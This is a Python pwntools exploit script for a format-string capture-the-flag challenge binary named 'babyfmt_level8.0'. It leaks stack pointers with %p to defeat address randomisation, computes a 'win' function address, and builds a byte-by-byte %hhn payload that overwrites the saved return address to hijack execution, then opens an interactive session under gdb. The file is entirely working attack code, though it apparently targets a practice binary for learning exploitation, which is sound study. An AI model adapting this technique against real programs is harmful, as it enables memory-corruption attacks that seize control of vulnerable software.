from pwn import * 

binary = './babyfmt_level8.0'
p = process(binary)

s = '''
b * printf
'''



# Initial leaks - you're already doing this well
payload = flat(
    "%155$p\n"
    "%154$p"
)

p.sendline(payload)
p.recvuntil("Your input is:")
p.recvline()

# Parse leaks
leak = p.recvline().strip().decode()
leak = int(leak, 16)
base = leak - 0x194e
win = base + 0x1553

leak = p.recvline().strip().decode()
leak = int(leak, 16)
rip = leak - 0x48

print(f"RIP address: {hex(rip)}")
print(f"Win address: {hex(win)}")

# Now, prepare to overwrite RIP with WIN
# We'll use byte-by-byte writes with parameter 33
# First, let's place our target addresses in the format string

# Extract individual bytes of win address
win_bytes = [0] * 8
for i in range(8):
    win_bytes[i] = (win >> (i * 8)) & 0xff


payload = b"------" # a bit of padding to align stuff on the stack 

param_pos = 43  # This is where the rip would be placed, the paramter position

# Keep track of how many chars have been printed
printed = len(payload) + 0x4a # start with the length of "Your input is:             "

# Write each byte
for i, byte in enumerate(win_bytes):
    # Calculate padding needed
    if byte < printed % 256:
        padding = 256 + byte - (printed % 256)
    else:
        padding = byte - (printed % 256)
    
    if padding != 0:  # Skip padding if 0
        payload += f"%{padding}c".encode()
        printed += padding
    
    # Write the byte to the address
    payload += f"%{param_pos + i}$hhn".encode()

# now place the address to write at the end of the payload
rip_addrs = [rip + i for i in range(8)]

for addr in rip_addrs:
    payload += p64(addr)
#print(payload)
gdb.attach(p, s)


p.sendline(payload)

# Going interactive
p.interactive()
